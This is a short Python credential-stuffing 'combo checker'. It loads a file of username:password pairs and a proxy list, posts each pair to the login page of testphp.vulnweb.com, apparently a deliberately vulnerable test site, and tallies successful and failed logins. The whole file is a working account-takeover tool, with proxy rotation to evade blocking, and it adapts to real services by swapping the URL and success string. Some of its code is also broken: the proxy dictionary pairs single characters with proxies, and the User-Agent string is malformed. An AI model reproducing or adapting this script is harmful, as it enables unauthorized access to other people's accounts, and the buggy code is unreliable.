from colorama import Fore,Style
from easygui import fileopenbox
from datetime import datetime
import requests
import ctypes
import random
import time
import os

bad = 0
good = 0

e = fileopenbox(default = '*.txt', title = "Select Combo File")
r = open(e, "r", errors="ignore").read().split("\n")
combolist = [x.strip() for x in r if x != '']

e = fileopenbox(default = '*.txt', title = "Select Proxy File")
r = open(e, "r", errors="ignore").read().split("\n")
proxies = [x.strip() for x in r if x != '']

pr = dict(zip("https://", proxies))

os.system('cls' if os.name == 'nt' else 'clear')

api = 'http://testphp.vulnweb.com/userinfo.php'

def tstamp():
    timestamp = time.time()
    date_time = datetime.fromtimestamp(timestamp)
    ts = str(date_time.strftime("%H:%M:%S"))
    return ts

for combo in combolist:
    seq = combo.strip()
    acc = seq.split(':')

    username = acc [0]
    password = acc [1]
    account = username + ':' + password
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 Pragma: no-cacheAccept: */*",
        "uname": username,
        "pass": password
    }

    req = requests.post(api,data=headers,proxies=pr).text
    ctypes.windll.kernel32.SetConsoleTitleW(f"Test Checker Good:- {good} | Bad:- {bad}")

    if "On this page you can visualize" in req:
        print(f"{Style.BRIGHT}{Fore.CYAN}{tstamp()} - {Fore.GREEN}[Hit]{Fore.CYAN} - {Fore.GREEN}" + account)
        good += 1
    if "username" in req:
        bad += 1
        print(f"{Style.BRIGHT}{Fore.CYAN}{tstamp()} - {Fore.RED}[BAD]{Fore.CYAN} - {Fore.RED}" + account)
